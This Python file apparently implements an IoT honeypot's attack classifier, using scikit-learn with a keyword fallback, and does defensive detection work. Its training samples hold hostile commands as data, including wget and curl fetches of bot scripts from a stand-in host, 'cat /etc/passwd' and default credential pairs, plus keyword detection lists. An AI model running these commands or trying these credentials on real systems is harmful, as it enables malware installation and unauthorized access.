from dataclasses import dataclass

try:
    from sklearn.ensemble import RandomForestClassifier
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.pipeline import Pipeline
except ImportError:
    RandomForestClassifier = None
    TfidfVectorizer = None
    Pipeline = None


@dataclass
class ClassificationResult:
    classification: str
    risk_level: str


TRAINING_SAMPLES = [
    ("fake_shell wget http://bad-host/bot.sh", "malware_download_attempt"),
    ("fake_shell curl http://example.com/payload", "malware_download_attempt"),
    ("fake_shell chmod +x update.sh", "malware_download_attempt"),
    ("fake_shell busybox tftp -g payload", "malware_download_attempt"),
    ("fake_shell ftpget 10.0.0.5 bot", "malware_download_attempt"),
    ("fake_shell mirai bot download", "malware_download_attempt"),
    ("http admin:admin password=admin", "credential_attack"),
    ("http root:root password=root", "credential_attack"),
    ("http root:123456 password=123456", "credential_attack"),
    ("http admin:password password=password", "credential_attack"),
    ("http login_failed username admin", "credential_attack"),
    ("fake_telnet password=admin123", "credential_attack"),
    ("fake_shell whoami", "reconnaissance"),
    ("fake_shell id", "reconnaissance"),
    ("fake_shell uname -a", "reconnaissance"),
    ("fake_shell ifconfig", "reconnaissance"),
    ("fake_shell ip addr", "reconnaissance"),
    ("fake_shell netstat -an", "reconnaissance"),
    ("fake_shell ps aux", "reconnaissance"),
    ("fake_shell cat /etc/passwd", "reconnaissance"),
    ("http GET /admin", "web_admin_scan"),
    ("http GET /login", "web_admin_scan"),
    ("http GET /wp-admin", "web_admin_scan"),
    ("http GET /phpmyadmin", "web_admin_scan"),
    ("http GET /config.php", "web_admin_scan"),
    ("http GET /.env", "web_admin_scan"),
    ("http GET /setup.cgi", "web_admin_scan"),
    ("fake_mqtt mqtt connect", "mqtt_probe"),
    ("fake_mqtt subscribe sensors/temperature", "mqtt_probe"),
    ("fake_mqtt publish topic camera/status", "mqtt_probe"),
    ("fake_mqtt topic sensor humidity", "mqtt_probe"),
    ("fake_mqtt MQTT protocol probe", "mqtt_probe"),
    ("http GET /", "general_probe"),
    ("http GET /favicon.ico", "general_probe"),
    ("fake_shell help", "general_probe"),
    ("fake_shell status", "general_probe"),
    ("fake_telnet version", "general_probe"),
    ("unknown random tcp payload", "general_probe"),
]

RISK_LEVELS = {
    "empty_or_unknown": "low",
    "malware_download_attempt": "high",
    "credential_attack": "medium",
    "reconnaissance": "medium",
    "web_admin_scan": "medium",
    "mqtt_probe": "medium",
    "general_probe": "low",
}


def _build_ml_classifier():
    if Pipeline is None:
        return None

    samples = [sample for sample, _label in TRAINING_SAMPLES]
    labels = [label for _sample, label in TRAINING_SAMPLES]

    model = Pipeline(
        [
            ("tfidf", TfidfVectorizer(ngram_range=(1, 2))),
            (
                "classifier",
                RandomForestClassifier(
                    n_estimators=100,
                    random_state=42,
                ),
            ),
        ]
    )
    model.fit(samples, labels)
    return model


ML_CLASSIFIER = _build_ml_classifier()


def _rule_based_classify(raw_input: str, service: str = "unknown") -> ClassificationResult:
    """
    Rule-based attack classifier fallback.

    This is intentionally simple for the starter version.
    """
    text = (raw_input or "").lower().strip()

    if not text:
        return ClassificationResult("empty_or_unknown", "low")

    malware_keywords = [
        "wget",
        "curl",
        ".sh",
        "chmod +x",
        "busybox",
        "tftp",
        "ftpget",
        "bot",
        "mirai",
        "payload",
    ]

    recon_keywords = [
        "whoami",
        "id",
        "uname",
        "ifconfig",
        "ip addr",
        "netstat",
        "ps aux",
        "ls",
        "pwd",
        "cat /etc/passwd",
    ]

    web_scan_keywords = [
        "/admin",
        "/login",
        "wp-admin",
        "phpmyadmin",
        "config.php",
        ".env",
        "setup.cgi",
    ]

    brute_force_keywords = [
        "admin:admin",
        "root:root",
        "root:123456",
        "admin:password",
        "login_failed",
        "password=",
    ]

    mqtt_keywords = [
        "mqtt",
        "subscribe",
        "publish",
        "topic",
        "sensor",
    ]

    if any(keyword in text for keyword in malware_keywords):
        return ClassificationResult("malware_download_attempt", "high")

    if any(keyword in text for keyword in brute_force_keywords):
        return ClassificationResult("credential_attack", "medium")

    if any(keyword in text for keyword in recon_keywords):
        return ClassificationResult("reconnaissance", "medium")

    if service == "http" and any(keyword in text for keyword in web_scan_keywords):
        return ClassificationResult("web_admin_scan", "medium")

    if any(keyword in text for keyword in mqtt_keywords):
        return ClassificationResult("mqtt_probe", "medium")

    return ClassificationResult("general_probe", "low")


def classify_input(raw_input: str, service: str = "unknown") -> ClassificationResult:
    text = (raw_input or "").lower().strip()

    if not text:
        return ClassificationResult("empty_or_unknown", "low")

    if ML_CLASSIFIER is None:
        return _rule_based_classify(raw_input, service=service)

    model_input = f"{service} {text}"
    classification = ML_CLASSIFIER.predict([model_input])[0]
    risk_level = RISK_LEVELS.get(classification, "low")

    return ClassificationResult(classification, risk_level)
